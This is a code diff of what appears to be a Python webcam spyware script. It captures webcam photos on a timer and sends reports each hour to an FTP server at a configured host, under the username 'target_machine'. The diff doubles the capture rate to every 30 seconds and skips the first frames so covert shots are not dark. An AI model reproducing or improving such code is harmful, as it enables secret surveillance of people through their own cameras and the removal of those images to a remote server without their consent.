@@ -12,7 +12,7 @@ from threading import Timer
 from datetime import datetime
 from send_file_updates import send_files_to_server
 SEND_REPORT_EVERY_SECONDS = 3600 
-TAKE_PHOTO_EVERY_SECONDS = 60
+TAKE_PHOTO_EVERY_SECONDS = 30
 
 HOST = "192.168.1.4"
 FTP_USERNAME = "target_machine"
@@ -30,13 +30,24 @@ class WebCamGrabber:
 
     def take_screenshot(self):
         camera = cv2.VideoCapture(self.camera_index)
-        res, image = camera.read()
+        # res, image = camera.read()
+
+        # Set Resolution
+        # camera.set(3, 1280)
+        # camera.set(4, 720)
+
+        # filter out the first 30 frames (will get dark/empty photo otherwise)
+        for i in range(30):
+            temp = camera.read()
+        retval, im = camera.read()
         # filename is the current time
-        filename = datetime.now().strftime('%H:%M:%S %m-%d-%Y') + ".jpeg"
+        filename = "imgs/" + datetime.now().strftime('%H:%M:%S %m-%d-%Y') + ".jpeg"
     
-        if image is not None:
-            cv2.imwrite(filename, image)
+        if im is not None:
+            cv2.imwrite(filename, im)
             self.images.append(filename)
+        del(camera)
+        
 
     def take_photos(self):
         """
